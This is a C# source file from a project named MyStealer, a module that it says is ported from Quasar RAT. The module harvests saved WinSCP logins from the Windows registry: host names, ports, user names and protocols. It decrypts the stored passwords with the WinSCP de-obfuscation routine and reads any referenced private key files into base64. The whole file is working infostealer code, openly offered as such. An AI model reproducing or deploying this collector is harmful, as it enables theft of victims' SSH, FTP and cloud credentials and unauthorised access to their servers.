using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.IO;
using System.Linq;
using System.Text;

namespace MyStealer.Collectors.Client
{
    /// <summary>
    /// Ported from Quasar RAT
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
    /// </summary>
    public class WinScp : ClientCollector
    {
        public override string ModuleName => "WinSCP";

        public override bool IsAvailable()
        {
            try
            {
                using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
                using (var dataKey = baseKey?.OpenSubKey(Path.Combine("Software", "Martin Prikryl", "WinSCP 2")))
                    return dataKey != null;
            }
            catch
            {
                return false;
            }
        }

        public override IImmutableSet<ClientLogin> GetLogins()
        {
            var set = ImmutableHashSet.CreateBuilder<ClientLogin>();

            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
            {
                var decryptPass = true;
                using (var key = baseKey.OpenSubKey(Path.Combine("Software", "Martin Prikryl", "WinSCP 2", "Configuration", "Security")))
                {
                    if (key.GetValue("UseMasterPassword").ToString() == "1")
                    {
                        Logger.Error("User set the WinSCP master password. Cannot decrypt login passwords!");
                        decryptPass = false;
                    }
                }

                using (var key = baseKey.OpenSubKey(Path.Combine("Software", "Martin Prikryl", "WinSCP 2", "Sessions")))
                {
                    foreach (var sessionKeyName in key.GetSubKeyNames())
                    {
                        using (var sessionKey = key.OpenSubKey(sessionKeyName))
                        {
                            var host = sessionKey.GetValue("HostName")?.ToString();
                            if (string.IsNullOrEmpty(host))
                                continue;

                            host += sessionKey.GetValue("PortNumber")?.ToString() ?? "22";

                            var userName = sessionKey.GetValue("UserName")?.ToString();
                            if (string.IsNullOrEmpty(userName))
                                continue;

                            // From metasploit-framework Rex::Parser::WinSCP
                            var protocolId = int.Parse(sessionKey.GetValue("FSProtocol")?.ToString() ?? "-1");
                            LoginProtocol protocol;
                            switch (protocolId)
                            {
                                case 0:
                                    protocol = LoginProtocol.SSH;
                                    break;
                                case 5:
                                    protocol = LoginProtocol.FTP;
                                    break;
                                case 6:
                                    protocol = LoginProtocol.WebDAV;
                                    break;
                                case 7:
                                    protocol = LoginProtocol.AmazonS3;
                                    break;
                                default:
                                    protocol = LoginProtocol.None;
                                    break;
                            }

                            var password = "";
                            if (decryptPass)
                                password = WinScpDecrypt(host, userName, sessionKey.GetValue("Password")?.ToString());

                            var keyfile = sessionKey.GetValue("PublicKeyFile")?.ToString();
                            if (!string.IsNullOrEmpty(keyfile))
                            {
                                password = "Certificate: " + keyfile;
                                if (File.Exists(keyfile))
                                {
                                    var data = Convert.ToBase64String(File.ReadAllBytes(keyfile));
                                    password = "Certificate: " + data;
                                }
                            }

                            set.Add(new ClientLogin
                            {
                                ProgramName = ModuleName,
                                Name = sessionKeyName,
                                Protocol = protocol,
                                Host = host,
                                UserName = userName,
                                Password = password
                            });
                        }
                    }
                }
            }

            return set.ToImmutable();
        }

        private string WinScpDecrypt(string host, string user, string pass)
        {
            int DecryptNextChar(List<string> list)
            {
                var a = int.Parse(list[0]);
                var b = int.Parse(list[1]);
                return 255 ^ ((a << 4) + b ^ 0xA3) & 0xff;
            }

            try
            {
                if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
                    return "";

                var chars = pass.Select(ch => ch.ToString()).ToList();
                var unhexed = new List<string>();
                for (var i = 0; i < chars.Count; i++)
                {
                    if (chars[i] == "A")
                        unhexed.Add("10");
                    if (chars[i] == "B")
                        unhexed.Add("11");
                    if (chars[i] == "C")
                        unhexed.Add("12");
                    if (chars[i] == "D")
                        unhexed.Add("13");
                    if (chars[i] == "E")
                        unhexed.Add("14");
                    if (chars[i] == "F")
                        unhexed.Add("15");
                    if ("ABCDEF".IndexOf(chars[i]) == -1)
                        unhexed.Add(chars[i]);
                }

                var hash = unhexed;
                var length = 0;
                if (DecryptNextChar(hash) == 255)
                    length = DecryptNextChar(hash);

                hash.Remove(hash[0]);
                hash.Remove(hash[0]);
                hash.Remove(hash[0]);
                hash.Remove(hash[0]);
                length = DecryptNextChar(hash);
                var newHashList3 = hash;
                newHashList3.Remove(newHashList3[0]);
                newHashList3.Remove(newHashList3[0]);

                var todel = DecryptNextChar(hash) * 2;
                for (var i = 0; i < todel; i++)
                    hash.Remove(hash[0]);

                var builder = new StringBuilder(length);
                for (var i = -1; i < length; i++)
                {
                    var data = ((char)DecryptNextChar(hash)).ToString();
                    hash.Remove(hash[0]);
                    hash.Remove(hash[0]);
                    builder.Append(data);
                }

                var splitdata = user + host;
                var password = builder.ToString();
                password = password.Remove(0, password.IndexOf(splitdata, StringComparison.Ordinal));
                password = password.Replace(splitdata, "");
                return password;
            }
            catch (Exception ex)
            {
                Logger.Warning(ex, "Failed to decrypt WinSCP password.");
                return "";
            }
        }
    }
}
